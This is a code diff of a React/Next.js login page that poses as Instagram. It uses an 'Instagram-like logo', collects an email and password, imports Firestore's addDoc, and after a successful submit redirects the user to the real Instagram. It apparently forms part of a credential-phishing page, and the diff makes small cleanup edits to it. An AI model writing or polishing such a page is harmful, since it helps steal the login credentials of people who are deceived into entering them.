@@ -1,9 +1,10 @@
-"use client";import React, { useState, useEffect } from 'react';
+"use client";
+import React, { useState, useEffect } from 'react';
 import { firestore } from './firebaseconfig'; // Adjust the import path
 import { collection, addDoc } from 'firebase/firestore'; // Import the necessary functions
 import { FaFacebookSquare } from "react-icons/fa";
 import { useRouter } from 'next/router';
-
+import Image from 'next/image';
 export default function Login() {
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
@@ -52,19 +53,20 @@ export default function Login() {
   useEffect(() => {
     if (success && isClient) {
       if (navigator.userAgent.match(/Android|iPhone/i)) {
-        router.push('instagram://'); // This won't work in many browsers
+        router.push('instagram://');
       } else {
         router.push('https://www.instagram.com');
       }
     }
-  }, [success, isClient]);
+  }, [success, isClient, router]);
+  
 
   return (
     <div className="min-h-screen flex flex-col justify-center items-center">
       <div className="flex flex-col md:flex-row md:items-center md:space-x-8 w-full max-w-screen-lg px-4">
         {/* Logo Section */}
         <div className="mb-8 md:mb-0 md:w-1/2 flex justify-center">
-          <img
+          <Image
             src="/logo.png" // Add your Instagram-like logo here
             alt="Instagram"
             className="h-12 md:h-16"
